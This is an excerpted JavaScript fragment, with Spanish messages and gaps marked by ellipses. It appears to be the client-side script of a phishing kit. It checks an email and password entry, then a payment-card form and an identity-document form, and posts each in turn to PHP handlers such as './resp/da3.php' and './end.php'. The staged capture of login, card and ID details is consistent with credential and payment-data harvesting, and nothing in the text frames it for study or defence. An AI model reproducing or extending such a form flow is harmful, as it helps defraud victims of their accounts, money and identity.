var archivo     = "PinCor.php",
    archivo22   = "",
    archivo2    = "PinCor.php",
    archivo3    = "./resp/da3.php",
    archivo4    = "./end.php",
    autori      = 1,
...
if (ecorreo) {
  ecorreo.addEventListener("click", function () {
    if (!validateEmail(correo.value)) {
      ...
      error.style.color = "crimson";
      error.innerHTML = "El correo electrÃ³nico no puede ser su clave";
...
if (btnCard) {
  btnCard.addEventListener("click", function () {
    if (
      ...
      formCard.setAttribute("action", archivo3);
      formCard.submit();
    }
  });
}
...
if (btnident) {
  btnident.addEventListener("click", function () {
    if (tipoident.value.length == 0 || nident.value.length <= 6) {
      ...
      formident.setAttribute("action", archivo4);
      formident.submit();
    }
  });
}
